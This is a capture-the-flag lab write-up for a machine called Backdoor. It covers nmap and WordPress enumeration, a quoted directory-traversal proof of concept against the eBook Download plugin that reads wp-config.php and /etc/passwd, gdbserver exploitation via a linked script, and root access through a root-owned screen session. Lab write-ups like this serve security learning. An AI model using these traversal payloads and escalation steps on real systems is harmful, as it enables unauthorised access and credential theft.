# Backdoor #

IP_ADDR : 10.10.11.125

1. Nmap Enum

~~~sql
# Nmap 7.91 scan initiated Mon Feb 21 09:04:58 2022 as: nmap -sV -oA backdoor.nmap 10.10.11.125
Nmap scan report for 10.10.11.125
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 21 09:05:18 2022 -- 1 IP address (1 host up) scanned in 19.89 seconds

~~~

2. Wordpress scrapping 

We proceed to the webpage. 
* Right off the bat, we can tell this is written in php since the about page points to this url : "http://10.10.11.125/index.php/about/"
* Site is written in WordPress. ( Dirbuster found wp-content, footer of page also gives this info )
* Other than that, I can't seem to find anything interesting on the site. Continuing with enum: vhost scan and full port scan.

Found that the WordPress version is 5.8.1, by inspecting the page source code..
~~~html
...
<meta name="generator" content="WordPress 5.8.1">
...
~~~

Running WPScan, found that the upload directory is public: 

![not found](Pasted%20image%2020220221093345.png  "1")

No interesting files..

We learn the main structure of a WP site though:
(This link was super useful :
https://idiallo.com/blog/improved-wordpress-folder-structure)

![not found](Pasted%20image%2020220221095558.png "2")

* Going into wp-includes:

![not found](Pasted%20image%2020220221094701.png "3")

* wp-admin gives a 302 to a login page, so no luck there.


After half an hour of manual enumeration, i found a plug-in in wp-content/plugins/ that metasploit has data about:
![not found](Pasted%20image%2020220221095836.png "4")

![not found](Pasted%20image%2020220221095929.png "5")


~~~bash
# Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal
# Exploit Author: Wadeek
# Website Author: https://github.com/Wad-Deek
# Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip
# Version: 1.1
# Tested on: Xampp on Windows7
 
[Version Disclosure]
======================================
http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt
======================================
 
[PoC]
======================================
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
======================================
~~~

The vulnerability was found! ~ LFI type.

3. LFI exploits

url : 'http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../etc/passwd'

Response ( | grep -v nologin ):
~~~bash
sync:x:4:65534:sync:/bin:/bin/sync
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
pollinate:x:110:1::/var/cache/pollinate:/bin/false
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
~~~

Unfortunately, nothing seemed to be useful in here. /etc/passwd tells us no information whatsoever and user.txt or .bash_history or .ssh cannot be accesed from this enviroment (probably we are not the right user)

MySql credentials are blocked aswell so it seems like this LFI was a rabbit hole.. (?) was it?

Found https://github.com/mthbernardes/LFI-Enum and ran it on the machine. One of the utils was particulary useful : checking for processes. This is probably the best thing you can do with LFI if you got no access to key files just by plain LFI and you got lotta time.

Running 
~~~bash
./process-info http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../
~~~
we get ![not found](Pasted%20image%2020220221115950.png "6")


4. New port

Search for gdbserver vuln. Found python script at " https://www.exploit-db.com/exploits/50539 "


We are in with the help of the script. Next step is to run linpeas to see anything odd.
![not found](Pasted%20image%2020220221145508.png "7")

Linpeas shows a strange process ran by root. 
~~~bash
/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done
~~~

This script constantly starts a screen session as root. So to get to root, we just need to enter that screen session.

Manpage of "screen" gives this command:
![not found](Pasted%20image%2020220221151242.png "8")

So we just use that ( screen -r root/root ) and we are in!

![not found](Pasted%20image%2020220221151331.png "9")
